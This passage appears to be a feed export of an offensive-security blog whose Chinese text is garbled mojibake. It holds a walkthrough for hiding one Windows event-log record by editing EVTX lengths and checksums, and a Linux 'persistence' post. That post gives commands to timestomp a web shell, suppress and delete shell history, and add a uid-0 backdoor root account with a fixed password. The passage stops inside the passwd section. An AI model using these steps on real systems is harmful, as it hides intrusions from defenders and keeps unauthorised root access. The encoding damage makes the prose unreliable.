<h5 id="2-è®¡ç®—æ ·æœ¬çš„ç¼–è¯‘æ—¶é—´"><a href="#2-è®¡ç®—æ ·æœ¬çš„ç¼–è¯‘æ—¶é—´" class="headerlink" title="2.è®¡ç®—æ ·æœ¬çš„ç¼–è¯‘æ—¶é—´"></a>2.è®¡ç®—æ ·æœ¬çš„ç¼–è¯‘æ—¶é—´</h5><p>æ—¶é—´æˆ³åœ¨NTå¤´å</p>
<p><img src="/posts/d8527941/7.png"></p>
<br>

<p><img src="/posts/d8527941/9.png"></p>
<p>å¯æ ¹æ®æ­¤æ‰¾åˆ°æ ·æœ¬3çš„æ—¶é—´æˆ³ä¸º <code>0x169FCED5</code>   åé¢ 0x00E0 -&gt; 224 è¯´æ˜æ˜¯32ä½ </p>
<p>è®¡ç®—æ–¹æ³•å¦‚ä¸‹</p>
<p><img src="/posts/d8527941/10.png"></p>
<br>

<p><img src="/posts/d8527941/11.png"></p>
<br>

<h5 id="3-åœ¨ODä¸­å»å¯¹ç…§æŸ¥çœ‹åœ°å€"><a href="#3-åœ¨ODä¸­å»å¯¹ç…§æŸ¥çœ‹åœ°å€" class="headerlink" title="3.åœ¨ODä¸­å»å¯¹ç…§æŸ¥çœ‹åœ°å€"></a>3.åœ¨ODä¸­å»å¯¹ç…§æŸ¥çœ‹åœ°å€</h5><p><img src="/posts/d8527941/12.png"></p>
<p>æ ·æœ¬3ä¸­ </p>
<p><code>AddressOfEntryPoint</code>  ç¨‹åºè™šæ‹Ÿå…¥å£åœ°å€ä¸º   <code>0x0002AE57h</code></p>
<p><code>BaseOfCode</code>  ä»£ç åŸºå€ä¸º <code>0x00001000h</code></p>
<p><code>BaseOfData</code>  æ•°æ®åŸºå€ä¸º <code>0x0003F000h</code></p>
<p><code>ImageBase</code>  ä¸º <code>0x10000000h</code></p>
<p>ä½¿ç”¨ODæ‰“å¼€å ç¬¬ä¸€è¡Œä¸º <code>AE57</code>  å³ ç¨‹åºçš„è™šæ‹Ÿå…¥å£åœ°å€</p>
<p><img src="/posts/d8527941/13.png"></p>
<p>ç¬¬ä¸€è¡Œçš„åœ°å€ä¸º 1000h  å³BaseOfCode ï¼ˆä»£ç åŸºå€åœ°å€ï¼‰</p>
<p>å‰é¢ä¸º1000 0000h å³ ImageBaseï¼ˆdllé»˜è®¤ä¸º 0x10000000hï¼‰</p>
]]></content>
  </entry>
  <entry>
    <title>ç—•è¿¹æ¸…ç†-Windowsç¯‡-02</title>
    <url>/posts/41ffc4f2/</url>
    <content><![CDATA[<p>å•æ¡æ—¥å¿—æ¸…ç†</p>
<p> å‚è€ƒä¸‰å¥½å¤§ä½¬çš„æ–‡ç«  </p>
<p><a href="https://3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%B8%80-%E5%88%A0%E9%99%A4%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E4%BE%8B">https://3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%B8%80-%E5%88%A0%E9%99%A4%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E4%BE%8B</a></p>
<h3 id="evtxåŸºç¡€çŸ¥è¯†"><a href="#evtxåŸºç¡€çŸ¥è¯†" class="headerlink" title="evtxåŸºç¡€çŸ¥è¯†"></a>evtxåŸºç¡€çŸ¥è¯†</h3><p>å‚è€ƒ<code> https://github.com/libyal/libevtx/blob/main/documentation/Windows XML Event Log (EVTX).asciidoc</code> </p>
<p>evtxæ–‡ä»¶ç»“æ„åŒ…å«3éƒ¨åˆ†</p>
<ul>
<li>file header</li>
<li>chunks</li>
<li>trailing empty values</li>
</ul>
<h4 id="file-header"><a href="#file-header" class="headerlink" title="file header"></a>file header</h4><p><a href="https://github.com/libyal/libevtx/blob/main/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#2-file-header">https://github.com/libyal/libevtx/blob/main/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#2-file-header</a></p>
<h3 id="chunks"><a href="#chunks" class="headerlink" title="chunks"></a>chunks</h3><p><a href="https://github.com/libyal/libevtx/blob/main/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#3-chunk">https://github.com/libyal/libevtx/blob/main/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#3-chunk</a></p>
<h4 id="trailing-empty-values"><a href="#trailing-empty-values" class="headerlink" title="trailing empty values"></a>trailing empty values</h4><p><a href="https://github.com/libyal/libevtx/blob/master/documentation/Windows%20XML%20Event%20Log%20%28EVTX%29.asciidoc#32-event-record">https://github.com/libyal/libevtx/blob/master/documentation/Windows%20XML%20Event%20Log%20%28EVTX%29.asciidoc#32-event-record</a></p>
<h3 id="å…·ä½“æ“ä½œ"><a href="#å…·ä½“æ“ä½œ" class="headerlink" title="å…·ä½“æ“ä½œ"></a>å…·ä½“æ“ä½œ</h3><h4 id="æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶"><a href="#æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶" class="headerlink" title="æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶"></a>æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶</h4><ul>
<li>ä½¿ç”¨äº‹ä»¶æŸ¥çœ‹å™¨æŸ¥çœ‹</li>
</ul>
<p><img src="/posts/41ffc4f2/1.png"></p>
<p>è¿™é‡Œè¦åˆ é™¤çš„è®°å½•ä¸º1915</p>
<p>åˆ é™¤åæ•ˆæœå¦‚ä¸‹</p>
<p><img src="/posts/41ffc4f2/2.png"></p>
<ul>
<li>ä½¿ç”¨pythonè„šæœ¬æŸ¥çœ‹</li>
</ul>
<p>å¯ä»¥ä½¿ç”¨è¯¥å·¥å…· <a href="https://github.com/williballenthin/python-evtx">https://github.com/williballenthin/python-evtx</a></p>
<p><code>python evtx_record_structure.py System.evtx 1915</code></p>
<p><img src="/posts/41ffc4f2/3.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\TEST\Desktop&gt;python evtx_record_structure.py System.evtx 1915</span><br><span class="line">00000000: 2A 2A 00 00 38 01 00 00  7B 07 00 00 00 00 00 00  **..8...&#123;.......</span><br><span class="line">00000010: 23 EB 07 A2 D4 FB D3 01  0F 01 01 00 0C 01 65 CE  #.............e.</span><br><span class="line">00000020: 1B C7 EE 0D 00 00 14 00  00 00 01 00 04 00 01 00  ................</span><br><span class="line">00000030: 04 00 02 00 06 00 02 00  06 00 02 00 06 00 08 00  ................</span><br><span class="line">00000040: 15 00 08 00 11 00 00 00  00 00 04 00 08 00 04 00  ................</span><br><span class="line">00000050: 08 00 08 00 0A 00 01 00  04 00 00 00 00 00 00 00  ................</span><br><span class="line">00000060: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000070: 00 00 00 00 00 00 8B 00  21 00 04 00 00 00 7C 1B  ........!.....|.</span><br><span class="line">00000080: 00 40 00 00 00 00 00 00  80 80 23 EB 07 A2 D4 FB  .@........#.....</span><br><span class="line">00000090: D3 01 D8 01 00 00 9C 07  00 00 7B 07 00 00 00 00  ..........&#123;.....</span><br><span class="line">000000A0: 00 00 00 0F 01 01 00 0C  01 DE E1 DC 34 6C 11 00  ............4l..</span><br><span class="line">000000B0: 00 04 00 00 00 4E 00 01  00 08 00 01 00 04 00 08  .....N..........</span><br><span class="line">000000C0: 00 0E 00 0E 00 42 00 61  00 63 00 6B 00 67 00 72  .....B.a.c.k.g.r</span><br><span class="line">000000D0: 00 6F 00 75 00 6E 00 64  00 20 00 49 00 6E 00 74  .o.u.n.d. .I.n.t</span><br><span class="line">000000E0: 00 65 00 6C 00 6C 00 69  00 67 00 65 00 6E 00 74  .e.l.l.i.g.e.n.t</span><br><span class="line">000000F0: 00 20 00 54 00 72 00 61  00 6E 00 73 00 66 00 65  . .T.r.a.n.s.f.e</span><br><span class="line">00000100: 00 72 00 20 00 53 00 65  00 72 00 76 00 69 00 63  .r. .S.e.r.v.i.c</span><br><span class="line">00000110: 00 65 00 63 6B 28 57 D0  8F 4C 88 0E 00 00 00 42  .e.ck(W..L.....B</span><br><span class="line">00000120: 00 49 00 54 00 53 00 2F  00 34 00 00 00 00 00 00  .I.T.S./.4......</span><br><span class="line">00000130: 15 00 00 00 38 01 00 00                           ....8...</span><br><span class="line">record(absolute_offset=8776)</span><br><span class="line">RootNode(offset=0x18)</span><br><span class="line">  StreamStartNode(offset=0x18)</span><br><span class="line">  TemplateInstanceNode(offset=0x1c, resident=False)</span><br><span class="line">  Substitutions(offset=0x26)</span><br><span class="line">    UnsignedByteTypeNode(offset=0x7a) --&gt; 4</span><br><span class="line">    UnsignedByteTypeNode(offset=0x7b) --&gt; 0</span><br><span class="line">    UnsignedWordTypeNode(offset=0x7c) --&gt; 0</span><br><span class="line">    UnsignedWordTypeNode(offset=0x7e) --&gt; 7036</span><br><span class="line">    UnsignedWordTypeNode(offset=0x80) --&gt; 16384</span><br><span class="line">    Hex64TypeNode(offset=0x82) --&gt; 0x8080000000000000</span><br><span class="line">    FiletimeTypeNode(offset=0x8a) --&gt; 2018-06-04 07:21:19.394281</span><br><span class="line">    NullTypeNode(offset=0x92)</span><br><span class="line">    UnsignedDwordTypeNode(offset=0x92) --&gt; 472</span><br><span class="line">    UnsignedDwordTypeNode(offset=0x96) --&gt; 1948</span><br><span class="line">    UnsignedQwordTypeNode(offset=0x9a) --&gt; 1915</span><br><span class="line">    UnsignedByteTypeNode(offset=0xa2) --&gt; 0</span><br><span class="line">    NullTypeNode(offset=0xa3)</span><br><span class="line">    NullTypeNode(offset=0xa3)</span><br><span class="line">    NullTypeNode(offset=0xa3)</span><br><span class="line">    NullTypeNode(offset=0xa3)</span><br><span class="line">    NullTypeNode(offset=0xa3)</span><br><span class="line">    NullTypeNode(offset=0xa3)</span><br><span class="line">    NullTypeNode(offset=0xa3)</span><br><span class="line">    BXmlTypeNode(offset=0xa3) --&gt;</span><br><span class="line">      RootNode(offset=0xa3)</span><br><span class="line">        StreamStartNode(offset=0xa3)</span><br><span class="line">        TemplateInstanceNode(offset=0xa7, resident=False)</span><br><span class="line">        Substitutions(offset=0xb1)</span><br><span class="line">          WstringTypeNode(offset=0xc5) --&gt; Background Intelligent Transfer Servi</span><br><span class="line">ce</span><br><span class="line">          WstringTypeNode(offset=0x113) --&gt; æ­£åœ¨è¿è¡Œ</span><br><span class="line">          UnsignedDwordTypeNode(offset=0x11b) --&gt; 14</span><br><span class="line">          BinaryTypeNode(offset=0x11f) --&gt; QgBJAFQAUwAvADQAAAA=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;&lt;System&gt;&lt;Pr</span><br><span class="line">ovider Name=&quot;Service Control Manager&quot; Guid=&quot;&#123;555908d1-a6d7-4695-8e1e-26931d2012f</span><br><span class="line">4&#125;&quot; EventSourceName=&quot;Service Control Manager&quot;&gt;&lt;/Provider&gt;</span><br><span class="line">&lt;EventID Qualifiers=&quot;16384&quot;&gt;7036&lt;/EventID&gt;</span><br><span class="line">&lt;Version&gt;0&lt;/Version&gt;</span><br><span class="line">&lt;Level&gt;4&lt;/Level&gt;</span><br><span class="line">&lt;Task&gt;0&lt;/Task&gt;</span><br><span class="line">&lt;Opcode&gt;0&lt;/Opcode&gt;</span><br><span class="line">&lt;Keywords&gt;0x8080000000000000&lt;/Keywords&gt;</span><br><span class="line">&lt;TimeCreated SystemTime=&quot;2018-06-04 07:21:19.394281&quot;&gt;&lt;/TimeCreated&gt;</span><br><span class="line">&lt;EventRecordID&gt;1915&lt;/EventRecordID&gt;</span><br><span class="line">&lt;Correlation ActivityID=&quot;&quot; RelatedActivityID=&quot;&quot;&gt;&lt;/Correlation&gt;</span><br><span class="line">&lt;Execution ProcessID=&quot;472&quot; ThreadID=&quot;1948&quot;&gt;&lt;/Execution&gt;</span><br><span class="line">&lt;Channel&gt;System&lt;/Channel&gt;</span><br><span class="line">&lt;Computer&gt;WIN-E8C6J8CN50O&lt;/Computer&gt;</span><br><span class="line">&lt;Security UserID=&quot;&quot;&gt;&lt;/Security&gt;</span><br><span class="line">&lt;/System&gt;</span><br><span class="line">&lt;EventData&gt;&lt;Data Name=&quot;param1&quot;&gt;Background Intelligent Transfer Service&lt;/Data&gt;</span><br><span class="line">&lt;Data Name=&quot;param2&quot;&gt;&amp;#27491;&amp;#22312;&amp;#36816;&amp;#34892;&lt;/Data&gt;</span><br><span class="line">&lt;Binary&gt;QgBJAFQAUwAvADQAAAA=&lt;/Binary&gt;</span><br><span class="line">&lt;/EventData&gt;</span><br><span class="line">&lt;/Event&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="åˆ é™¤å•æ¡æ—¥å¿—æ€è·¯â€”â€”è¦†ç›–"><a href="#åˆ é™¤å•æ¡æ—¥å¿—æ€è·¯â€”â€”è¦†ç›–" class="headerlink" title="åˆ é™¤å•æ¡æ—¥å¿—æ€è·¯â€”â€”è¦†ç›–"></a>åˆ é™¤å•æ¡æ—¥å¿—æ€è·¯â€”â€”è¦†ç›–</h4><p>ä¿®æ”¹æ—¥å¿— Event Record sizeé•¿åº¦ï¼Œç„¶åè¦†ç›–æ‰ä¸‹ä¸€æ¡æ—¥å¿—ï¼Œè¿™æ ·windowsåœ¨è§£ææ—¥å¿—æ—¶ï¼Œä¸‹ä¸€æ¡æ—¥å¿—å°±ä¼šè¢«éšè—ï¼Œä»è€Œå®ç°æ‰€è°“çš„å•æ¡ç›®å½•çš„åˆ é™¤</p>
<p><img src="/posts/41ffc4f2/4.png" alt="ä»å¤§ä½¬é‚£é‡ŒæŠ„çš„å›¾"></p>
<p>å…·ä½“æ–¹æ³•:</p>
<ul>
<li><p>1.file headerä¸­çš„Next record identifierå‡ä¸€</p>
</li>
<li><p>2.é‡æ–°è®¡ç®—file header ä¸­çš„ chunksum</p>
</li>
<li><p>3.ä¿®æ”¹Event Record:</p>
<p>é‡æ–°è®¡ç®—å¾…åˆ é™¤Event Recordå‰åé•¿åº¦ï¼Œæ›´æ–°åç»­Event Recordçš„Event record identifier</p>
</li>
<li><p>4.æ›´æ–°ElfChnkï¼Œ</p>
</li>
</ul>
<h4 id="åˆ é™¤å•æ¡æ—¥å¿—çš„å®ä¾‹"><a href="#åˆ é™¤å•æ¡æ—¥å¿—çš„å®ä¾‹" class="headerlink" title="åˆ é™¤å•æ¡æ—¥å¿—çš„å®ä¾‹"></a>åˆ é™¤å•æ¡æ—¥å¿—çš„å®ä¾‹</h4><p>å®ä¾‹æ ·æœ¬ <a href="https://github.com/3gstudent/Eventlogedit-evtx--Evolution/blob/master/System.evtx">https://github.com/3gstudent/Eventlogedit-evtx--Evolution/blob/master/System.evtx</a></p>
<h5 id="File-header-Next-record-identifierå€¼-1"><a href="#File-header-Next-record-identifierå€¼-1" class="headerlink" title="File header   Next record identifierå€¼ -1"></a>File header   Next record identifierå€¼ -1</h5><p>è¿™é‡Œé‡‡ç”¨å°ç«¯åº 0x077c  å‡ä¸€åä¸º 0x77b</p>
<p><img src="/posts/41ffc4f2/5.png" alt="ä¿®æ”¹å"></p>
<h5 id="é‡æ–°è®¡ç®—checksumå€¼"><a href="#é‡æ–°è®¡ç®—checksumå€¼" class="headerlink" title="é‡æ–°è®¡ç®—checksumå€¼"></a>é‡æ–°è®¡ç®—checksumå€¼</h5><p><img src="/posts/41ffc4f2/6.png" alt="åŸå€¼"></p>
<p>è®¡ç®—å‰120bytes çš„ CRC32ï¼Œç›´æ¥å¼•ç”¨å¤§ä½¬çš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crc2hex</span>(<span class="params">crc</span>):   </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;%08x&#x27;</span> % (binascii.crc32(binascii.a2b_hex(crc)) &amp; <span class="number">0xffffffff</span>)     </span><br><span class="line"></span><br><span class="line">d=<span class="string">&#x27;456C6646696C6500000000000000000000000000000000007B0700000000000080000000010003000010010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>  </span><br><span class="line"><span class="built_in">print</span>(crc2hex(d)</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ç»“æœä¸º <code>ccc94756</code> ç„¶åè¿›è¡Œæ›¿æ¢ </p>
<p><img src="/posts/41ffc4f2/7.png"></p>
<h5 id="ä¿®æ”¹Event-Record"><a href="#ä¿®æ”¹Event-Record" class="headerlink" title="ä¿®æ”¹Event Record"></a>ä¿®æ”¹Event Record</h5><h5 id="é‡æ–°è®¡ç®—å¾…åˆ é™¤Event-Recordå‰åé•¿åº¦ï¼Œæ›´æ–°åç»­Event-Recordçš„Event-record-identifier"><a href="#é‡æ–°è®¡ç®—å¾…åˆ é™¤Event-Recordå‰åé•¿åº¦ï¼Œæ›´æ–°åç»­Event-Recordçš„Event-record-identifier" class="headerlink" title="é‡æ–°è®¡ç®—å¾…åˆ é™¤Event Recordå‰åé•¿åº¦ï¼Œæ›´æ–°åç»­Event Recordçš„Event record identifier"></a>é‡æ–°è®¡ç®—å¾…åˆ é™¤Event Recordå‰åé•¿åº¦ï¼Œæ›´æ–°åç»­Event Recordçš„Event record identifier</h5><p><img src="/posts/41ffc4f2/8.png"></p>
<p>Event recordå¤´ä¸º 0x2a\0x2a\0x00\0x00 åœ¨010editoræœç´¢ä¸€ä¸‹ æ‰¾åˆ°Event recordå¤´</p>
<p>é€”ä¸­çš„ 0x0778 å¯¹åº”å€¼ä¸º 1912 è¿™ä¸ªæ˜¯æ—¥å¿—ä¸­çš„ç¬¬ä¸€æ¡æ—¥å¿—ï¼Œè¿™é‡Œè¦åˆ é™¤1915 é‚£ä¹ˆå»æ‰¾åˆ°  0x077bå€¼å¯¹åº”çš„EventRecordï¼ˆç¬¬å››æ¡æ—¥å¿—ï¼‰</p>
<p><img src="/posts/41ffc4f2/10.png" alt="ç¬¬å››æ¡æ—¥å¿—"></p>
<p>é•¿åº¦ä¸º 0x0138h  EventRecord ID ä¸º 0x77bh(1915)</p>
<p>ç»“å°¾å¤„çš„å€¼ä¸ºEventRecord é•¿åº¦ 0x138h åœ¨åé¢éœ€è¦è¦†ç›–åä¹Ÿè¦ä¿®æ”¹è¿™ä¸ªå€¼</p>
<p>å†æ‰¾åˆ°ç¬¬ä¸‰æ¡æ—¥å¿—</p>
<p><img src="/posts/41ffc4f2/11.png"></p>
<p>é•¿åº¦ä¸º 0x0480h EventRecord IDä¸º 0x77ah (1914)</p>
<p>æ‰¾åˆ°ä¸¤æ¡æ—¥å¿—å ä¿®æ”¹ä¸€ä¸‹ ç¬¬ä¸‰æ¡æ—¥å¿—çš„é•¿åº¦ ä½¿å…¶è¦†ç›–æ‰ç¬¬å››æ¡æ—¥å¿—</p>
<p>New_legth = 0x138h+0x480h=0x5b8h</p>
<p><img src="/posts/41ffc4f2/12.png"></p>
<p>ç„¶åæ›´æ–°ç¬¬å››æ¡æ—¥å¿—æœ€åé¢çš„é•¿åº¦ ä»0x138h æ”¹ä¸º 0x5b8h</p>
<p><img src="/posts/41ffc4f2/13.png"></p>
<h5 id="æ›´æ–°ElfChnk"><a href="#æ›´æ–°ElfChnk" class="headerlink" title="æ›´æ–°ElfChnk"></a>æ›´æ–°ElfChnk</h5><p><img src="/posts/41ffc4f2/15.png"></p>
<p><img src="/posts/41ffc4f2/16.png"></p>
<p><a href="https://github.com/libyal/libevtx/blob/main/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#31-chunk-header">https://github.com/libyal/libevtx/blob/main/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#31-chunk-header</a></p>
<p>åœ¨æµ‹è¯•æ—¥å¿—ä¸­åªæœ‰ä¸€ä¸ªElfchnk ä½†åˆ«çš„å¯èƒ½ä¼šæœ‰å¤šä¸ªElfChnk éœ€è¦æ‰¾åˆ°å¯¹åº”çš„ ElfChnk </p>
<p><img src="/posts/41ffc4f2/14.png"></p>
<p>ä¿®æ”¹<code>last Event record number</code>  0x04h -1 =  0x03h </p>
<p>ä¿®æ”¹<code>last Event record identifier</code> 0x77bh -1 = 0x77ah </p>
<p>ä¿®æ”¹<code>Last event record data offset</code>  0x1248h =&gt;  0xDC8h</p>
<p>ä¸ºç¬¬ä¸‰æ¡Event Record(æœ€åä¸€æ¡)ç›¸å¯¹äºElfChukçš„åç§»é•¿åº¦   </p>
<p>ElfChnk ä¸º 0x1000h ç¬¬ä¸‰æ¡å¼€å§‹ä½ç½®ä¸º 0x1DC8h  æ‰€ä»¥åç§»é‡ä¸º 0xDC8h</p>
<p>ä¿®æ”¹<code>Event records checksum</code> 0xD3D3DE43h =&gt;  0xF92FEDB9h</p>
<p><code>Event records checksum</code> ä¸ºæ‰€æœ‰Event records çš„æ ¡éªŒå’Œ è¿™é‡Œéœ€è¦è®¡ç®—ä¸‰æ¡çš„ </p>
<p>è®¡ç®—è¿‡ç¨‹ æŠ½æ—¶é—´ç®—ä¸€ä¸‹ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~`</p>
<p>è®¡ç®—åä¸º <code>0xF92FEDB9h</code></p>
<p>ä¿®æ”¹<code> Checksum</code>  0xEB4C47BFh =&gt; 0x3CE0BF8h</p>
<p>è®¡ç®—å‰120 å’Œ128-512 å¤„çš„CRC32å€¼  ç»“æœä¸º <code>0x3CE0BF8h</code></p>
<p><img src="/posts/41ffc4f2/17.png"></p>
<p>å¦å­˜åæ‰“å¼€ å¯ä»¥çœ‹åˆ° ç¬¬å››æ¡æˆ‘ä»¬æƒ³è¦åˆ é™¤çš„æ—¥å¿—å·²ç»æˆåŠŸéšè—</p>
<p><img src="/posts/41ffc4f2/18.png"></p>
]]></content>
      <categories>
        <category>ç—•è¿¹æ¸…ç†</category>
      </categories>
      <tags>
        <tag>ç—•è¿¹æ¸…ç†</tag>
      </tags>
  </entry>
  <entry>
    <title>æƒé™ç»´æŒ-Linuxç¯‡</title>
    <url>/posts/29801cba/</url>
    <content><![CDATA[<h3 id="Linuxæƒé™ç»´æŒ"><a href="#Linuxæƒé™ç»´æŒ" class="headerlink" title="Linuxæƒé™ç»´æŒ"></a>Linuxæƒé™ç»´æŒ</h3><h4 id="0x00-éšè—æŠ€å·§"><a href="#0x00-éšè—æŠ€å·§" class="headerlink" title="0x00 éšè—æŠ€å·§"></a>0x00 éšè—æŠ€å·§</h4><h5 id="ä¿®æ”¹æ–‡ä»¶-ç»ˆç«¯å±æ€§"><a href="#ä¿®æ”¹æ–‡ä»¶-ç»ˆç«¯å±æ€§" class="headerlink" title="ä¿®æ”¹æ–‡ä»¶/ç»ˆç«¯å±æ€§"></a>ä¿®æ”¹æ–‡ä»¶/ç»ˆç«¯å±æ€§</h5><p>ä¿®æ”¹æ–‡ä»¶çš„ç”Ÿæˆæ—¶é—´</p>
<p><code>touch -r index.php shell.php</code></p>
<p>touchå‘½ä»¤ç”¨äºä¿®æ”¹æ–‡ä»¶æˆ–è€…ç›®å½•çš„æ—¶é—´å±æ€§ï¼ŒåŒ…æ‹¬å­˜å–æ—¶é—´å’Œæ›´æ”¹æ—¶é—´ã€‚è‹¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œç³»ç»Ÿä¼šå»ºç«‹ä¸€ä¸ªæ–°çš„æ–‡ä»¶</p>
<h5 id="æ–‡ä»¶é”å®š"><a href="#æ–‡ä»¶é”å®š" class="headerlink" title="æ–‡ä»¶é”å®š"></a>æ–‡ä»¶é”å®š</h5><p>Linuxä¸­ä½¿ç”¨<code>chattr</code>å‘½ä»¤æ¥é˜²æ­¢rootå’Œå…¶ä»–ç®¡ç†ç”¨æˆ·è¯¯åˆ é™¤å’Œä¿®æ”¹é‡è¦æ–‡ä»¶ä»¥åŠç›®å½•ï¼Œæ­¤æƒé™æ˜¯ç”¨<code>ls -l</code>æŸ¥çœ‹ä¸å‡ºæ¥çš„ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chattr +i test.php #é”å®šæ–‡ä»¶</span><br><span class="line">rm -rf test.php #æç¤ºç¦æ­¢åˆ é™¤æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">lsattr test.php #å±æ€§æŸ¥çœ‹</span><br><span class="line">chattr -i test.php #è§£é™¤é”å®š</span><br><span class="line">rm -rf test.php #å½»åº•åˆ é™¤æ–‡ä»¶</span><br></pre></td></tr></table></figure>

<h5 id="å†å²æ“ä½œå‘½ä»¤"><a href="#å†å²æ“ä½œå‘½ä»¤" class="headerlink" title="å†å²æ“ä½œå‘½ä»¤"></a>å†å²æ“ä½œå‘½ä»¤</h5><p><code>[space]set +o history #å¤‡æ³¨ï¼š[space]è¡¨ç¤ºç©ºæ ¼ã€‚å¹¶ä¸”ç”±äºç©ºæ ¼çš„åŸå› ï¼Œè¯¥å‘½ä»¤æœ¬èº«ä¹Ÿä¸ä¼šè¢«è®°å½•ã€‚</code></p>
<p>ä¸Šé¢çš„å‘½ä»¤ä¼šä¸´æ—¶ç¦ç”¨å†å²åŠŸèƒ½ï¼Œå³æ‰§è¡Œåçš„å‘½ä»¤ä¸ä¼šè®°å½•åœ¨å†å²ä¸­</p>
<p><code>[space]set -o history #å°†ç¯å¢ƒæ¢å¤åŸçŠ¶</code></p>
<p>åˆ é™¤å†å²è®°å½•ä¸­çš„æŒ‡å®šå‘½ä»¤</p>
<p><code>history | grep &quot;keyword&quot;</code></p>
<p>è¾“å‡ºäº†å†å²è®°å½•ä¸­åŒ¹é…çš„å‘½ä»¤ï¼Œæ¯ä¸€æ¡å‰é¢ä¼šæœ‰ä¸ªæ•°å­—ã€‚ä»å†å²è®°å½•ä¸­åˆ é™¤é‚£ä¸ªæŒ‡å®šçš„é¡¹ï¼š</p>
<p><code>history -d [num] </code></p>
<p>å¤§è§„æ¨¡åˆ é™¤å†å²æ“ä½œè®°å½•</p>
<p><code>set -i &#39;150,$d&#39; .bash_history   #åªä¿ç•™å‰150è¡Œ</code></p>
<h4 id="0x01-æ·»åŠ ç”¨æˆ·"><a href="#0x01-æ·»åŠ ç”¨æˆ·" class="headerlink" title="0x01 æ·»åŠ ç”¨æˆ·"></a>0x01 æ·»åŠ ç”¨æˆ·</h4><h5 id="æ·»åŠ æ™®é€šç”¨æˆ·"><a href="#æ·»åŠ æ™®é€šç”¨æˆ·" class="headerlink" title="æ·»åŠ æ™®é€šç”¨æˆ·"></a>æ·»åŠ æ™®é€šç”¨æˆ·</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># åˆ›å»ºä¸€ä¸ªç”¨æˆ·åguestï¼Œå¯†ç 123456çš„æ™®é€šç”¨æˆ·</span><br><span class="line">useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest</span><br><span class="line"># useradd -p æ–¹æ³• ` ` æ˜¯ç”¨æ¥å­˜æ”¾å¯æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤,&quot;$()&quot;ä¹Ÿå¯ä»¥å­˜æ”¾å‘½ä»¤æ‰§è¡Œè¯­å¥</span><br><span class="line">useradd -p &quot;$(openssl passwd -1 123456)&quot; guest</span><br><span class="line"># chpasswdæ–¹æ³•</span><br><span class="line">useradd guest;echo &#x27;guest:123456&#x27;|chpasswd</span><br><span class="line"># echo -eæ–¹æ³•</span><br><span class="line">useradd test;echo -e &quot;123456\n123456\n&quot; |passwd test</span><br></pre></td></tr></table></figure>

<h5 id="æ·»åŠ rootç”¨æˆ·"><a href="#æ·»åŠ rootç”¨æˆ·" class="headerlink" title="æ·»åŠ rootç”¨æˆ·"></a>æ·»åŠ rootç”¨æˆ·</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># åˆ›å»ºä¸€ä¸ªç”¨æˆ·åguestï¼Œå¯†ç 123456çš„rootç”¨æˆ·</span><br><span class="line">useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest -o -u 0 -g root -G root</span><br><span class="line">-s /bin/bash -d /home/test</span><br></pre></td></tr></table></figure>

<h5 id="passwdå†™å…¥"><a href="#passwdå†™å…¥" class="headerlink" title="passwdå†™å…¥"></a>passwdå†™å…¥</h5><p>(æ³¨:ç°åœ¨è¾ƒæ–°çš„ç³»ç»Ÿæ— æ³•æˆåŠŸåˆ©ç”¨ åœ¨suåˆ‡æ¢ç”¨æˆ·æ—¶ä¼šæç¤ºç”¨æˆ·ä¸å­˜åœ¨)</p>
